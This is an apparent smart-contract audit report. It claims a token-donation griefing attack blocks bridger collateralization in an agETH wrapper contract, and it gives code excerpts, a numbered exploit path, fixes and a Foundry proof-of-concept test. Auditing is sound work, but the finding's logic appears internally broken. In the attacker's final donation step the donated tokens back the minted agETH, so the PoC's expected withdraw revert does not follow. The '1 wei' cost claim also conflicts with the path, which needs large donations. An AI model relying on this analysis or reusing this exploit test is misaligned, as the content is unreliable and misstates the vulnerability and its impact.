Audit Report

## Title
Donation Attack Permanently Blocks Bridger Collateralization via `depositBridgerAssets` — (`contracts/agETH/AGETHTokenWrapper.sol`)

## Summary

`maxAmountToDepositBridgerAsset` computes available deposit capacity using a live `ERC20.balanceOf` call rather than internal accounting. Any altAgETH holder can transfer tokens directly to the wrapper address, inflating `balanceOfAssetInWrapper` above `agETHSupply` and forcing the function to return 0. Because `depositBridgerAssets` gates strictly on this return value, the bridger is blocked from collateralizing L2-minted agETH, leaving those tokens unredeemable until privileged admin intervention.

## Finding Description

`maxAmountToDepositBridgerAsset` reads the wrapper's altAgETH balance directly from the token contract: [1](#0-0) 

```solidity
uint256 agETHSupply = totalSupply();
uint256 balanceOfAssetInWrapper = ERC20Upgradeable(_asset).balanceOf(address(this));

if (balanceOfAssetInWrapper > agETHSupply) return 0;

return agETHSupply - balanceOfAssetInWrapper;
```

`depositBridgerAssets` enforces this cap strictly: [2](#0-1) 

```solidity
function depositBridgerAssets(address _asset, uint256 _amount) external onlyRole(BRIDGER_ROLE) {
    if (maxAmountToDepositBridgerAsset(_asset) < _amount) {
        revert CannotDeposit();
    }
```

**Exploit path:**

1. Wrapper is fully collateralized: `balance == supply`.
2. Attacker calls `altAgETH.transfer(address(wrapper), 1)` — no wrapper function is invoked, so no agETH is minted. Now `balance = supply + 1`.
3. `maxAmountToDepositBridgerAsset` evaluates `balanceOfAssetInWrapper > agETHSupply` → `true` → returns `0`.
4. Bridger mints agETH on L2 via `mint` (supply increases, balance unchanged). Now `supply > balance` by the minted amount minus 1.
5. Attacker donates the same amount to restore `balance >= supply`, returning the cap to 0.
6. `depositBridgerAssets` reverts for any positive `_amount`.

**Why no self-healing exists:**

- `_withdraw` burns agETH and transfers altAgETH out — both `supply` and `balance` decrease equally; the donated surplus persists. [3](#0-2) 

- `_deposit` mints agETH and receives altAgETH — both sides increase equally; surplus persists. [4](#0-3) 

- `mint` (MINTER_ROLE) can increase supply without touching balance — the only workaround — but it introduces uncollateralized agETH and requires privileged action. [5](#0-4) 

- No `recoverTokens` or equivalent function exists anywhere in the contract. [6](#0-5) 

## Impact Explanation

The `depositBridgerAssets` function is the sole mechanism for the bridger to back agETH minted on L2 via `mint`. When blocked, users holding L2-minted agETH cannot call `withdraw`/`withdrawTo` because the wrapper lacks sufficient altAgETH balance to satisfy the `safeTransfer`. This constitutes **temporary freezing of funds (Medium)** — the affected agETH is unredeemable until admin uses `mint` to shift the supply/balance ratio, an action that itself introduces uncollateralized tokens and can be immediately re-griefed by the attacker.

## Likelihood Explanation

- **Cost to attacker**: 1 wei of altAgETH (negligible).
- **Permissions required**: None — any altAgETH holder can call `altAgETH.transfer(wrapperAddress, 1)`.
- **Precondition**: Wrapper at or near full collateralization, which is the normal post-bridger operating state.
- **Repeatability**: Attacker can re-donate after each admin recovery attempt, making sustained griefing trivially cheap and continuous.

## Recommendation

Replace the live `balanceOf` read in `maxAmountToDepositBridgerAsset` with an internal accounting variable (e.g., `uint256 private _trackedBalance`) that is incremented only inside `_deposit` and `depositBridgerAssets`, and decremented only inside `_withdraw`. Direct ERC-20 transfers to the contract address will then have no effect on the computed cap.

Additionally, add a privileged `recoverExcessTokens` function allowing the admin to drain any surplus (`balanceOf(address(this)) - _trackedBalance`) to prevent donated tokens from permanently skewing accounting.

## Proof of Concept

```solidity
function test_donationBlocksBridger() public {
    // Setup: agETHSupply == balanceOfAssetInWrapper (fully collateralized)
    // e.g., 100e18 agETH minted, 100e18 altAgETH in wrapper
    assertEq(wrapper.totalSupply(), altAgETH.balanceOf(address(wrapper)));

    // Step 1: Attacker donates 1 wei directly (no wrapper function called)
    vm.prank(attacker);
    altAgETH.transfer(address(wrapper), 1);

    // maxAmountToDepositBridgerAsset now returns 0
    assertEq(wrapper.maxAmountToDepositBridgerAsset(address(altAgETH)), 0);

    // Step 2: Bridger mints 10e18 agETH on L2 (supply now > balance by 10e18 - 1)
    vm.prank(minter);
    wrapper.mint(user, 10e18);

    // Step 3: Attacker donates 10e18 wei to restore balance >= supply
    vm.prank(attacker);
    altAgETH.transfer(address(wrapper), 10e18);

    // depositBridgerAssets reverts for any positive amount
    vm.prank(bridger);
    vm.expectRevert(AGETHTokenWrapper.CannotDeposit.selector);
    wrapper.depositBridgerAssets(address(altAgETH), 1);

    // User holding L2-minted agETH cannot redeem — wrapper has no backing for it
    vm.prank(user);
    vm.expectRevert(); // safeTransfer fails: insufficient altAgETH in wrapper
    wrapper.withdraw(address(altAgETH), 10e18);
}
```
